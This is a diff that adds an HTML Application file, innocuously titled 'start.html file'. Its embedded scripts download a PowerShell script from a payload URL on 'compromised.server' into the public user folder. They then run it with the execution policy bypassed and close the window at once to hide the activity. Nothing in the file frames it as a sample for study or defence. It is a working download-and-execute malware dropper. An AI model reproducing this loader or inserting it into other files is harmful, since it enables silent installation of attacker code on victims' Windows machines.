@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>start.html file</title>
+  <hta:application id="downloadFile" />
+  <script>
+      // Get the URL and local file path
+      var strURL = "http://compromised.server/payloads/dkrtjd.ps1";
+      var strFilePath = "c:\\Users\\Public\\dkrtjd.ps1";
+      
+      // Create a HTTP object
+      var objHTTP = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+      
+      // Set the HTTP request method and URL
+      objHTTP.open("GET", strURL, false);
+      
+      // Send the HTTP request and wait for the response
+      objHTTP.send();
+      
+      // Check if the HTTP request was successful
+      if (objHTTP.status == 200) {
+        // Create a file object
+        var objFSO = new ActiveXObject("Scripting.FileSystemObject");
+        
+        // Create the local file
+        var objFile = objFSO.CreateTextFile(strFilePath);
+        
+        // Write the response to the local file
+        objFile.Write(objHTTP.responseText);
+        
+        // Close the local file
+        objFile.Close();
+        
+    }
+  </script>
+  <script>
+  var command = "PowerShell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\dkrtjd.ps1";
+  var shell = new ActiveXObject("WScript.Shell");
+  var exec = shell.Exec("powershell.exe -Command \"" + command + "\"");
+  </script>
+  
+  <script>
+  self.close();
+  </script>
+</head>
+<body>
+  <h1>start.html file</h1>
+  
+  
+</body>
+</html>
